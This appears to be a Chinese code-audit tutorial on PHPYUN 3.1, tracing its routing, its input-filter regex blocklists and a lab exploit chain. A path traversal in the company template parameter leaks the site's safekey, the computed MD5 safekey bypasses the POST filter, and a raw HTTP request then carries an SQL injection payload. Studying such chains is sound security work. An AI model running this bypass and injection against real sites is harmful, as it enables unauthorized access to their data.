---
title: 【微信】PHP代码审计-PHPYUN-Bypass防护实现SQL注入
source: https://mp.weixin.qq.com/s/3JxpZXRQmg-ZiNMcGGPYiQ
source_host: mp.weixin.qq.com
clip_date: 2026-11-08T03:56:40+08:00
trace_id: 36ff8b70-9e99-4de3-ae46-3589aeeac798
content_hash: b4a2583866a3dc524df0de59f6d5444f0c0e9ad0e44162e4d645320e8a1dd996
status: synced
tags:
  - 微信
series: null
feed_source: 公众号聚合·Doonsec
ai_summary: null
ai_summary_style: null
images_status:
  total: 24
  succeeded: 24
  failed_urls: []
notion_page_id: 41175244-d011-8123-8ef3-e9e2258c8abb
ioc:
  cves: []
  cwes: []
  hashes:
    - 5d8faa937b9d5a8c58c83d9efa64124c
    - 7a6e00e31f1589cf4359605176597959
  domains: []
  tools: []
  techniques: []
---

**风铃Sec** *2026年11月7日 19:19*

如果你也刚好在学习代码审计，不妨下载如下源码跟着文章一起跟一下漏洞调用链，源码打包如下：

```
phpyun3.1.rar

链接: https://pan.baidu.com/s/12-aIdfjJuyR388PdkcSymQ?pwd=x9pq 提取码: x9pq
链接：https://pan.quark.cn/s/8b1a1ca24beb
```

#### 系统部署

下载压缩包 ，解压 /upload 文件夹内容到网站目录下

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/d4cd569a51278f7f.png)

笔者这边还进一步做了目录重命名的操作。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/3aad0290b58dc137.png)

接着浏览器访问该路径，走完安装路径即可。默认用户名/密码：admin/admin。

后台管理：

```
http://localhost/phpyun/admin/index.php
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/986108697a8a9deb.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/4d4b3f294f0190a3.png)

首页：

```
http://localhost/phpyun
```

###### php代码动态调试具体配置可参考笔者PHP代码审计第一篇文章《PHP代码审计-动态调试配置（附环境）》，虽然使用的PHP版本可能不一样，但是过程都是一样的。

#### 路由分析

入口文件代码如下：

```php
include(dirname(__FILE__)."/global.php");
if($config['webcache']=="1"){
    include_once(LIB_PATH."web.cache.php");
    $cache=new Phpyun_Cache('./cache',dirname(__FILE__)."/",$config['webcachetime']);
    $cache->read_cache();
}
$var=@explode('-',str_replace('/','-',$_GET['yunurl']));
foreach($var as $p){
    $param=@explode('_',$p);
    $_GET[$param[0]]=$param[1];
}
unset($_GET['yunurl']);
if($_GET['m'] && !ereg("^[0-9a-zA-Z\_]*$",$_GET['m'])){
    
    $_GET['m'] = 'index';
}
$model = $_GET['m'];
$action = $_GET['c'];
if($model=="")  $model="index";
if($action=="") $action = "index";
if(!is_file(MODEL_PATH.$model.'.class.php')){
    $controller='index';
    $action='index';
}
require(MODEL_PATH.'class/common.php');
require("model/".$model.'.class.php');
$conclass=$model.'_controller';
$actfunc=$action.'_action';
$views=new $conclass($phpyun,$db,$db_config["def"],"index",$model);
if(!method_exists($views,$actfunc)){
    $views->DoException();
}
$views->$actfunc();
if($config['webcache']=="1"){
    $cache->CacheCreate();
}
?>
```

这段代码实现了一个典型的 **"model-controller-action" 三段式路由**，路由参数来源 `$_GET['m']` ，参数 `m` 表示 `model` （模型名，同时决定控制器类前缀）和 `$_GET['c']` 参数 `c` 表示 `action` （方法名，实际是 `action` 名）。URL 形态大致为：

```
index.php?m=index&c=index
```

加载模型文件：

```
require("model/".$model.'.class.php');
```

控制器类名与方法名拼接：

```php
$conclass = $model.'_controller';
$actfunc  = $action.'_action';
$views = new $conclass($phpyun,$db,$db_config["def"],"index",$model);
```

控制器类名 = `{model}_controller` ，例如 `index_controller` 、方法名 = `{action}_action` ，例如 `index_action` 。

##### 路由总结

如现在有一下请求：

```
URL: http://localhost/phpyun/index.php?m=login
```

处理逻辑：

```
m 为空或非法([^0-9a-zA-Z_]) → m = index
c 为空                     → c = index
模型文件 {MODEL_PATH}{m}.class.php 不存在 → 本应回退 index（实际失效，会报错）
```

最终映射结果：

```
模型文件 = model/login.class.php
控制器类 = login_controller
执行方法 = index_action
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/b15b668d6445c7bf.png)

#### SQL注入

在系统项目中存在一个wap目录，该目录为移动端（手机端）独立访问模块， `WAP` 原本是 Wireless Application Protocol（无线应用协议）的缩写，现在很多 PHP 内容管理系统（CMS）仍然使用 `wap` 作为移动端目录名称。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/6ed9b6cd1b8b92e1.png)

查看其入口文件发现路由模式与前面路由分析内容一致。关注到以下代码：

```bash
if($model=="")  $model="index";
if($action=="") $action = "index";
```

结合路由模式分析可知，此时如果直接访问wap目录，则调用的是： `wap\model\index.class.php` 文件中的 `index_controller` 的 `index_action` 。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/f3ac163fecd75167.png)

跟进 `get_moblie()` 函数：

```php
function get_moblie(){
    $UA = strtoupper($_SERVER['HTTP_USER_AGENT']);
    if(strpos($UA, 'WINDOWS NT') !== false){
        header("location:".$this->config['sy_weburl']."/index.php?c=moblie");
    }
    $now_url=@explode("/",$_SERVER['REQUEST_URI']);
    $now_url=$now_url[count($now_url)-1];
    $this->yunset("wapstyle","../template/wap");
    $this->yunset("now_url",$now_url);
}
```

该函数通过 UA 判断访问者是否使用 Windows 系统，如果匹配 Windows NT，则跳转到指定页面。此时在Windows中可以通过笔者前阵子推的玄镜工具绕过这个检测，工具设置如下：

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/cec448a55d1b47aa.png)

工具下载：

```
https://pan.quark.cn/s/afd39965d724
```

配置完成后，访问路径：

```
http://192.168.213.1/phpyun/wap/
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/96857cb353592499.png)

成功访问。当然还有另一种方法，就是直接在Linux环境下访问该URL：

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/70d06d60c5d2a85b.png)

无需任何修改直接就可以访问成功，但是后续的动态调试就会受影响，如果要动调的话可能就得配置远程代码调试，比较麻烦，所以使用Windows系统的推荐使用第一种方式绕过检测。使用Mac和Linux的兄弟就比较轻松了。言归正传，接下去点击右上角的人像图标，来到登录界面，URL为：

```
http://localhost/phpyun/wap/index.php?m=login
```

定位到 `wap\login.class.php` 文件 `login_controller` 中的 `index_action` ，并下断点开始动调：

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/305218df462cc68b.png)

这边用户提交的 `username` 被删除了反斜杠，处理后的用户名被拼接进 SQL 查询语句。发送如下payload：

```
username=aaaa'
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/57d7d390ecc474bf.png)

发现到数据流到这里，单引号还是被做了处理：单引号 `'` 前面多了一个反斜杠 `\` ，单引号 `'` 变成了 HTML 实体 `&acute` 。但是由于这个位置做了将反斜杠置为空的操作：

```
str_replace('\\','',$_POST['username']);
```

所以关于添加反斜杠的就不用管了，只需要关注单引号 `'` 变成了 HTML 实体 `&acute` 这个操作是在哪里做的。向上回溯代码发现 `index.php` 中导入了 `global.php` ：

```
include(dirname(dirname(__FILE__))."/global.php");
```

在 `global.php` 中又导入了：

```
include(CONFIG_PATH."db.safety.php");
```

`db.safety.php` 代码如下：

```swift
function quotesGPC() {

    if(!get_magic_quotes_gpc()){
        $_POST = array_map("addSlash", $_POST);
        $_GET = array_map("addSlash", $_GET);
        $_COOKIE = array_map("addSlash", $_COOKIE);
    }

}
function addSlash($el) {
    if (is_array($el))
        return array_map("addSlash", $el);
    else
        return addslashes($el);
}
function gpc2sql($str) {

    if(preg_match("/select|insert|update|delete|union|into|load_file|outfile/is", $str))
    {
        exit(safe_pape());
    }
    $arr=array(" and "=>" an d "," or "=>" Ｏr ","%20"=>"","select"=>"Ｓelect","update"=>"Ｕpdate","count"=>"Ｃount","chr"=>"Ｃhr","truncate"=>"Ｔruncate","union"=>"Ｕnion","delete"=>"Ｄelete","insert"=>"Ｉnsert");
    foreach($arr as $key=>$v){
        $str = preg_replace('/'.$key.'/isU',$v,$str);
    }
    return $str;
}
function safeid($v){
    if(strstr($v,",")){
        $arr=explode(',',$v);
        foreach($arr as $val){
            $value[]=(int)$val;
        }
        $v=implode(',',$value);
    }elseif(is_array($v)){
        foreach($v as $val){
            $value[]=(int)$val;
        }
        $v=$value;
    }else{
        $v=int($v); 
    }
    return $v;
}
function safesql($StrFiltKey,$StrFiltValue,$type){
    
    $getfilter = "\\<.+javascript:window\\[.{1}\\\\x|<.*=(&#\\d+?;?)+?>|<.*(data|src)=data:text\\/html.*>|\\b(alert\\(|confirm\\(|expression\\(|prompt\\(|benchmark\s*?\\(\d+?|sleep\s*?\\([\d\.]+?\\)|load_file\s*?\\()|<[a-z]+?\\b[^>]*?\\bon([a-z]{4,})\s*?=|^\\+\\/v(8|9)|\\b(and|or)\\b\\s*?([\\(\\)'\"\\d]+?=[\\(\\)'\"\\d]+?|[\\(\\)'\"a-zA-Z]+?=[\\(\\)'\"a-zA-Z]+?|>|<|\s+?[\\w]+?\\s+?\\bin\\b\\s*?\(|\\blike\\b\\s+?[\"'])|\\/\\*.+?\\*\\/|\\/\\*\\*\\/|<\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT(\\(.+\\)|\\s+?.+?)|UPDATE(\\(.+\\)|\\s+?.+?)SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE)(\\(.+\\)|\\s+?.+?\\s+?)FROM(\\(.+\\)|\\s+?.+?)|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)";

    $postfilter = "<.*=(&#\\d+?;?)+?>|<.*data=data:text\\/html.*>|\\b(alert\\(|confirm\\(|expression\\(|prompt\\(|benchmark\s*?\\(\d+?|sleep\s*?\\([\d\.]+?\\)|load_file\s*?\\()|<[^>]*?\\b(onerror|onmousemove|onload|onclick|onmouseover)\\b|\\b(and|or)\\b\\s*?([\\(\\)'\"\\d]+?=[\\(\\)'\"\\d]+?|[\\(\\)'\"a-zA-Z]+?=[\\(\\)'\"a-zA-Z]+?|>|<|\s+?[\\w]+?\\s+?\\bin\\b\\s*?\(|\\blike\\b\\s+?[\"'])|\\/\\*.+?\\*\\/|\\/\\*\\*\\/|<\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT(\\(.+\\)|\\s+?.+?)|UPDATE(\\(.+\\)|\\s+?.+?)SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE)(\\(.+\\)|\\s+?.+?\\s+?)FROM(\\(.+\\)|\\s+?.+?)|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)";

    $cookiefilter = "benchmark\s*?\\(\d+?|sleep\s*?\\([\d\.]+?\\)|load_file\s*?\\(|\\b(and|or)\\b\\s*?([\\(\\)'\"\\d]+?=[\\(\\)'\"\\d]+?|[\\(\\)'\"a-zA-Z]+?=[\\(\\)'\"a-zA-Z]+?|>|<|\s+?[\\w]+?\\s+?\\bin\\b\\s*?\(|\\blike\\b\\s+?[\"'])|\\/\\*.+?\\*\\/|\\/\\*\\*\\/|<\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT(\\(.+\\)|\\s+?.+?)|UPDATE(\\(.+\\)|\\s+?.+?)SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE)(\\(.+\\)|\\s+?.+?\\s+?)FROM(\\(.+\\)|\\s+?.+?)|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)";
    
    if($type=="GET")
    {
        $ArrFiltReq = $getfilter;

    }elseif($type=="POST"){
        
        $ArrFiltReq = $postfilter;
    
    }elseif($type=="COOKIE"){

        $ArrFiltReq = $cookiefilter;
    }
    if(is_array($StrFiltValue))
    {
        foreach($StrFiltValue as $key=>$value)
        {
            safesql($key,$value,$type);
        }
    }else{
        if (preg_match("/".$ArrFiltReq."/is",html_entity_decode($StrFiltValue,ENT_NOQUOTES,"GB2312"))==1)
        {
             exit(safe_pape());
        }
    }
    if (preg_match("/".$ArrFiltReq."/is",$StrFiltKey)==1)
    {
         exit(safe_pape());
    }
}
function common_htmlspecialchars($str){
    
    $str = str_replace(
    array('<','>','"',"'","--"),
    array('&lt;','&gt;','&quot;',"&acute;","- -"),
    $str);
    return gpc2sql($str);
}
function sfkeyword($v,$config){
    
     if($config['sy_fkeyword'])
     {

        $fkey = @explode(",",$config['sy_fkeyword']);
        
        $safe_keyword = $config['sy_fkeyword_all'];
        
        return str_replace($fkey, $safe_keyword, $v);
     }
}
quotesGPC();
if($config['sy_istemplate']!='1' || md5(md5($config['sy_safekey']).$_GET['m'])!=$_POST['safekey'])
{
    foreach($_POST  as $id=>$v){
        safesql($id,$v,"POST",$config);
        $id = sfkeyword($id,$config);
        $v = sfkeyword($v,$config);
        $_POST[$id]=common_htmlspecialchars($v);
    }
}
foreach($_GET  as $id=>$v){
    
    safesql($id,$v,"GET",$config);
    $id = sfkeyword($id,$config);
    $v = sfkeyword($v,$config);
    if(!is_array($v))
    $v=substr(strip_tags($v),0,80);

    $_GET[$id]=common_htmlspecialchars($v);
}

foreach($_COOKIE  as $id=>$v){
    
    safesql($id,$v,"COOKIE",$config);
    $id = sfkeyword($id,$config);
    $v = sfkeyword($v,$config);
    $v=substr(strip_tags($v),0,52);
    $_COOKIE[$id]=common_htmlspecialchars($v);
}
```

这里实际上存在 两层处理：GPC 自动转义和 HTML 特殊字符转换。现在按照代码执行顺序梳理一下上述代码：

```php
function quotesGPC() {
    if(!get_magic_quotes_gpc()){
        $_POST = array_map("addSlash", $_POST);
        $_GET = array_map("addSlash", $_GET);
        $_COOKIE = array_map("addSlash", $_COOKIE);
    }
}
```

如果 PHP 没有开启 `magic_quotes_gpc` ，就主动调用 `addSlash()` 处理 GET、POST、COOKIE 参数。所以会加上反斜杠。第二层：common_htmlspecialchars() —— HTML 特殊字符转换

```php
function common_htmlspecialchars($str) {
    $str = str_replace(
        array('<','>','"',"'","--"),
        array('&lt;','&gt;','&quot;',"&acute;","- -"),
        $str
    );
    return gpc2sql($str);
}
```

这个函数将原始字符

```
<
>
"
'
--
```

转化为：

```
&lt;
&gt;
&quot;
&acute;
- -
```

因此纯文本 `aaaa\'` 处理后得到 `aaaa\&acute;`，重点看如下代码：

```php
if($config['sy_istemplate']!='1' || md5(md5($config['sy_safekey']).$_GET['m'])!=$_POST['safekey'])
{
    foreach($_POST  as $id=>$v){
        safesql($id,$v,"POST",$config);
        $id = sfkeyword($id,$config);
        $v = sfkeyword($v,$config);
        $_POST[$id]=common_htmlspecialchars($v);
    }
}
```

先来看一下这个if分支中的代码：它会遍历用户提交的所有 `POST` 参数，对参数进行安全检测、关键词替换和特殊字符转换，最后重新写入 `$_POST` 。现在就要想办法让下面的条件判断不为真：

```bash
if($config['sy_istemplate']!='1' || md5(md5($config['sy_safekey']).$_GET['m'])!=$_POST['safekey'])
```

先看第一个条件 `$config` 的值来自于 `plus/config.php` ，我们直接进入 `config.php` 文件中查看 `sy_istemplate` 参数的值：

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/cc8c1e313c3ac434.png)

这个时候： `$config['sy_istemplate']!='1'` 恒为假，接下去就要尝试构造让 `md5(md5($config['sy_safekey']).$_GET['m'])!=$_POST['safekey']` 为假，就可以绕过这层过滤了。接下去的目标就是构造参数让：

```bash
md5(md5($config['sy_safekey']).$_GET['m']) = $_POST['safekey']
```

再转化一下当前目标：如何未授权获取 `$config['sy_safekey'])` ，这边直接全局搜索 `sy_safekey` ：

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/f2974aa233df19ad.png)

这个 `sy_safekey` 有尝试在 `admin_web_config.htm` 模板中引用了该变量。

```
http://192.168.213.1/phpyun/template/admin/admin_web_config.htm
```

我们尝试直接访问，我们可以清楚地看到该模板是无法直接被渲染的。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/1576082e4b1861f8.png)

这个时候回到 `global.php` 中找一下，该系统是否有在此处引入模板引擎。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/d4e778c2e9c084ab.png)

很明显，PHPYUN使用的模板引擎为Smarty。这边大概说一下Smarty模板引擎的使用：

```php
templates 存放模板⽂件
templates_c 存放编译后的⽂件templates
$smarty = new smarty(); 初始化⼀个smarty对象
$smarty->assign("Address",$address); ⽤来赋值到模板中。可以指定⼀对 名称/数值，也可以指定包含 名称/数值 的联合数组。
$smarty->display('模板⽂件'，缓存ID) ⽣成缓存
```

创建模板对象 → 给模板传递数据 → 加载模板并输出页面。 `assign()` 有两个主要参数：

```
$smarty->assign('变量名', '变量值');
```

这里相当于把 PHP 变量 `name` 赋值为 `Ned` ，并传递给 Smarty 模板。假设 `index.tpl` 内容如下：

```
<html>
<body>
    Hello, {$name}!
</body>
</html>
```

Smarty 会将 `{$name}` 替换为 `Ned` 。

回到主线，在引入模板引擎后，这边立刻实例化了一个smarty对象：

```php
include_once(LIB_PATH.'libs/Smarty.class.php');
$phpyun = new smarty();
$phpyun->template_dir = APP_PATH.'/template/';    //Smarty 对象初始化的位置，display函数在该目录中进行操作
$phpyun->compile_dir  = APP_PATH.'/templates_c/';
$phpyun->cache_dir    = APP_PATH.'/cache/';
$phpyun->left_delimiter = "{yun:}";
$phpyun->right_delimiter = "{/yun}";
$phpyun->get_install();
```

那么现在模板对象已经有了，模板也有了 `admin_web_config.htm` ，我们接下去就要找找看系统是否有使用 `assign` 将 `$config` 赋值到模板的操作，如果有，下一步就是找到通过 `display` 加载模板并输出页面且使用的模板需要可控。接下去顺藤摸瓜，看看哪里调用了 `$phpyun` 这个对象：

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/fae965bcc29457ef.png)

发现入口函数就有这个对象的调用：

```php
require(MODEL_PATH.'class/common.php');
require("model/".$model.'.class.php');
$conclass=$model.'_controller';
$actfunc=$action.'_action';
$views=new $conclass($phpyun,$db,$db_config["def"],"index",$model);
```

这里new了一个index_controller对象，并将$phpyun作为构造函数参数传入，根据路由查看model下的index.class.php。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/86532c471cfe1491.png)

进来以后发现没有构造函数，那就接着往上查看父类代码，此时构造函数出现了，并且看到了我们的 `$config`

```php
class common
{
    public $tpl='';
    public $db='';
    public $obj='';
    public $config = '';
    public $uid="";
    public $data="";
    public $username="";
    function common($tpl,$db,$def="",$model="index",$m="") {

        global $config;
        $this->config = $config;
        $this->tpl=$tpl;
        $this->db=$db;
        $this->uid=intval($_COOKIE['uid']);
        $this->username=$_COOKIE['username'];
        $this->def=$def;
        $this->m=$m;
```

这个时候在common这个基类中查找是否有地方调用了 `assign` 函数，发现此处封装了一个 `yunset` 函数。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/3228226f7117cdef.png)

下一步看看 `yunset` 函数的调用：结果非常多。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/61f846281b64b7b7.png)

根据 `smarty` 的使用方法，使用 `yunset` 函数给模板传递数据后，下一步就是要加载模板并输出页面，所以我们可以合理推断 `yuntpl` 实际上就是对 `smarty` 的 `display` 函数的封装，跟进yuntpl查看实现代码：

```php
function yuntpl($tplarr=array()){
    if(is_array($tplarr) && $tplarr!=''){
        foreach($tplarr as $v){
            $this->tpl->display($v.".htm");
        }
    }else{
        echo "模版不能为空！";die;
    }
}
```

发现跟我们预想的一样，但是 `yuntpl` 下面还封装了另一个函数 `yun_tpl` ：

```php
function yun_tpl($tplarr=array()){
    if(is_array($tplarr) && $tplarr!=''){
        foreach($tplarr as $v){
            $rand=mktime();
            $this->tpl->display($this->config['style']."/".$this->m."/".$v.".htm");
        }
    }else{
        echo "模版不能为空！";die;
    }
}
```

说明等下我们在审计的时候这两个函数都需要关注。好的，接下去就要确认一下，这几个函数是否有我们可以控制的点。这个时候找到如下代码 `company/model/index.class.php` 。

```php
function index_action(){
    if($this->uid!=$_GET['id']&&$_COOKIE['usertype']=='1'){
        $show=$this->obj->DB_select_once("atn","`sc_uid`='".$_GET['id']."' and `uid`='".$this->uid."'");
        $this->yunset("usertype",'1');
        $this->yunset("show",$show);
    }
    if($_POST['submit'])
    {
        $black=$this->obj->DB_select_once("blacklist","`p_uid`='".$this->uid."' and `c_uid`='".$_POST['id']."'");
        if(!empty($black))
        {
            $this->obj->ACT_layer_msg("您已被该企业列入黑名单，不能评论该企业！",8,$_SERVER['HTTP_REFERER']);
        }
        $qiye=$this->obj->DB_select_once("company","`uid`='".$_POST['id']."'","`pl_status`");
        $data['uid']=$this->uid;
        $data['content']=$_POST['content'];
        $data['cuid']=(int)$_POST['id'];
        $data['ctime']=time();
        if ($qiye['pl_status']=='2')
        {
            $data['status']=0;
            $nid=$this->obj->insert_into("company_msg",$data);
            isset($nid)?$this->obj->ACT_layer_msg("评论成功，请等待企业审核！",9,$_SERVER['HTTP_REFERER']):$this->obj->ACT_layer_msg("评论失败，请稍后再试！",8,$_SERVER['HTTP_REFERER']);
        }else{
            $data['status']=1;
            $nid=$this->obj->insert_into("company_msg",$data);
            isset($nid)?$this->obj->ACT_layer_msg("评论成功！",9,$_SERVER['HTTP_REFERER']):$this->obj->ACT_layer_msg("评论失败，请稍后再试！",8,$_SERVER['HTTP_REFERER']);
        }
    }
    if($_POST['submit2'])
    {
        $data['reply']=$_POST['content'];
        $data['reply_time']=time();
        $where['id']=(int)$_POST['id'];
        $where['cuid']=$this->uid;
        $nid=$this->obj->update_once("company_msg",$data,$where);
        isset($nid)?$this->obj->ACT_layer_msg("回复成功！",9,$_SERVER['HTTP_REFERER']):$this->obj->ACT_layer_msg("回复失败，请稍后再试！",8,$_SERVER['HTTP_REFERER']);
    }
    $urlarr=array("page"=>"{{page}}");
    $urlarr['id']=$_GET['id'];
    $urlarr['tp']=$_GET['tp'];
    $pageurl=$this->url("index","index",$urlarr,'1');
    $msglist=$this->get_page("company_msg","`cuid`='".$_GET['id']."' and `status`='1' order by id desc",$pageurl,"10");
    if(is_array($msglist))
    {
        foreach($msglist as $v)
        {
            $uid[]=$v['uid'];
        }
        $uid=@implode(",",$uid);
        $user=$this->obj->DB_select_all("resume","`uid` in (".$uid.")");
        foreach($msglist as $k=>$v){
            foreach($user as $val){
                if($v['uid']==$val['uid']){
                    $msglist[$k]["name"]=$val['name'];
                    $msglist[$k]["photo"]=$val['photo'];
                    $msglist[$k]["eid"] = $val['def_job'];
                }
            }
        }
    }
    $this->yunset("msglist",$msglist);
    $this->yunset("usertype",$_COOKIE["usertype"]);
    $this->yunset("id",$_GET['id']);
    $this->yunset("uid",$_COOKIE["uid"]);
    $this->public_action();
    $row=$this->obj->DB_select_alls("company","company_statis","a.`uid`=b.`uid` and a.uid='".(int)$_GET['id']."'");
    if(!is_array($row)){
        $this->obj->ACT_msg($_SERVER['HTTP_REFERER'],"没有找到该企业！");
    }elseif($row[r_status]==2){
        $this->obj->ACT_msg($_SERVER['HTTP_REFERER'],"该企业暂被锁定，请稍后查看！");
    }
    $this->obj->update_once("company",array("hits"=>"`hits`+1"),array("uid"=>(int)$_GET['id']));
    $row=$row[0];
    $cert=@explode(",",$row['cert']);
    include(PLUS_PATH."city.cache.php");
    include(PLUS_PATH."com.cache.php");
    include(PLUS_PATH."industry.cache.php");
    $row['provinceid']=$city_name[$row['provinceid']];
    $row['mun_info']=$comclass_name[$row['mun']];
    $row['pr_info']=$comclass_name[$row['pr']];
    $row['hy_info']=$industry_name[$row['hy']];
    $row['logo']=str_replace("./",$this->config['sy_weburl']."/",$row['logo']);

    $banner=$this->obj->DB_select_once("banner","`uid`='".$_GET['id']."'");
    $banner['pic']=str_replace("..",$this->config['sy_weburl'],$banner['pic']);
    $this->yunset("banner",$banner);

     if($this->config['com_login_link']=="1")
     {
        if($this->uid=="" && $this->username=="")
        {
            $look_msg="您还没有登录，登录后才可以查看联系方式！";
            $looktype="2";
        }else if($_GET['id']!=$_COOKIE['uid']){
            if($_COOKIE["usertype"]!="1"   )
            {
                $look_msg="您不是个人用户，不能查看联系方式！";
            }else{
                if($this->config['com_resume_link']=="1")
                {
                    $rows=$this->obj->DB_select_all("resume_expect","`uid`='".$this->uid."'");
                    if(!is_array($rows)||empty($rows))
                    {
                        $look_msg="您还没有个人简历，不能查看联系方式！";
                        $looktype="1";
                    }
                }
            }
        }
     }
    $this->yunset("comclass_name",$comclass_name);
    $this->yunset("com",$row);
    $this->yunset("cert",$cert);
    $this->yunset("looktype",$looktype);
    $this->yunset("look_msg",$look_msg);
    if($row['comtpl'] && $row['comtpl']!="default" && !$_GET['style'])
    {
        $tplurl=$row[comtpl];
        $this->registrs();
    }else{
        $tplurl="default";
    }
    if($_GET['style']){
        $tplurl=$_GET['style'];
    }
    $tp=$_GET['tp']?$_GET['tp']:"index";
    $this->seo("company_".$tp);
    $this->yunset("com_style",$this->config['sy_weburl']."/template/company/".$tplurl."/");
    $this->yunset("comstyle","../template/company/".$tplurl."/");
    $this->yunset("defaultstyle","../template/default/");
    $this->yuntpl(array('company/'.$tplurl."/".$tp));

}
```

开始动调，我们的目的是要让 `yuntpl` 这个函数成功执行，第一个踩坑点：

```php
$this->yunset("msglist",$msglist);
$this->yunset("usertype",$_COOKIE["usertype"]);
$this->yunset("id",$_GET['id']);
$this->yunset("uid",$_COOKIE["uid"]);
$this->public_action();
$row=$this->obj->DB_select_alls("company","company_statis","a.`uid`=b.`uid` and a.uid='".(int)$_GET['id']."'");
if(!is_array($row)){
    $this->obj->ACT_msg($_SERVER['HTTP_REFERER'],"没有找到该企业！");
}elseif($row[r_status]==2){
    $this->obj->ACT_msg($_SERVER['HTTP_REFERER'],"该企业暂被锁定，请稍后查看！");
}
```

该模块会先 `$_GET['id']` 接受一个id参数，判断是否存在该企业，如果存在企业，则会直接结束，无法到达yuntpl，所以这里需要先注册一个企业。截止目前URL如下：

```
http://192.168.213.1/phpyun/company/index.php?id=1
```

接着我们往下看，接收一个 `tp` 参数，而 `tp` 参数是我们可控的：

```php
if($row['comtpl'] && $row['comtpl']!="default" && !$_GET['style'])
{
    $tplurl=$row[comtpl];
    $this->registrs();
}else{
    $tplurl="default";
}
if($_GET['style']){
    $tplurl=$_GET['style'];
}
$tp=$_GET['tp']?$_GET['tp']:"index";
$this->seo("company_".$tp);
$this->yunset("com_style",$this->config['sy_weburl']."/template/company/".$tplurl."/");
$this->yunset("comstyle","../template/company/".$tplurl."/");
$this->yunset("defaultstyle","../template/default/");
$this->yuntpl(array('company/'.$tplurl."/".$tp));
```

`$tplurl` 默认为default， `$tp` 可控，所以可构造如下请求：

```
http://192.168.213.1/phpyun/company/index.php?id=1&tp=../../admin/admin_web_config
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/0145b7691f4505e1.png)

获得系统安全码。

坑点：在smarty对象初始化时存在如下设置

```
$phpyun->template_dir = APP_PATH.'/template/'
```

此时模板的操作目录为template，所以最后的加载模板并输出页面代码：

```php
$this->yuntpl(array('company/'.$tplurl."/".$tp));
```

实际上是在template目录下操作的。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/9f6b343a46f982f4.png)

而不是 `company` 目录，这也是为什么最后构造的tp为

```
tp=../../admin/admin_web_config
```

而不是

```
tp=../../template/admin/admin_web_config
```

至此获得系统安全码：99357299，回到wap界面，构造数据包绕过如下防护：

```php
if($config['sy_istemplate']!='1' || md5(md5($config['sy_safekey']).$_GET['m'])!=$_POST['safekey'])
{
    foreach($_POST  as $id=>$v){
        safesql($id,$v,"POST",$config);
        $id = sfkeyword($id,$config);
        $v = sfkeyword($v,$config);
        $_POST[$id]=common_htmlspecialchars($v);
    }
}
```

构造safekey:

```
md5(md5(99357299) + login)
= md5(7a6e00e31f1589cf4359605176597959login)
= 5d8faa937b9d5a8c58c83d9efa64124c
```

最后构造的数据包为

```bash
POST /phpyun/wap/index.php?m=login&point=%7F%7F%7F%7F%7F%7F%7F%7F%7F%7F HTTP/1.1
Host: 192.168.213.1
Content-Length: 74
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36 EdgA/125.0.0.0
Origin: http://192.168.213.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/jxl,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.213.1/phpyun/wap/index.php?m=login&point=%7F%7F%7F%7F%7F%7F%7F%7F%7F%7F
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=q6ohijvrohjv2sp6o1d6hmk1q7; XDEBUG_SESSION=14887
sec-ch-ua-platform: "Android"
sec-ch-ua: "Chromium";v="125", "Google Chrome";v="125"
sec-ch-ua-mobile: ?1
sec-ch-ua-arch: "arm"
sec-ch-ua-bitness: ""
sec-ch-ua-full-version: "125.0.0.0"
sec-ch-ua-full-version-list: "Chromium";v="125.0.0.0", "Google Chrome";v="125.0.0.0"
sec-ch-ua-model: "Android"
sec-ch-ua-platform-version: ""
Connection: keep-alive

usertype=&wxid=&username=aaaaaa%27&password=asixijaiai&submit=%B5%C7%C2%BC&safekey=5d8faa937b9d5a8c58c83d9efa64124c
```

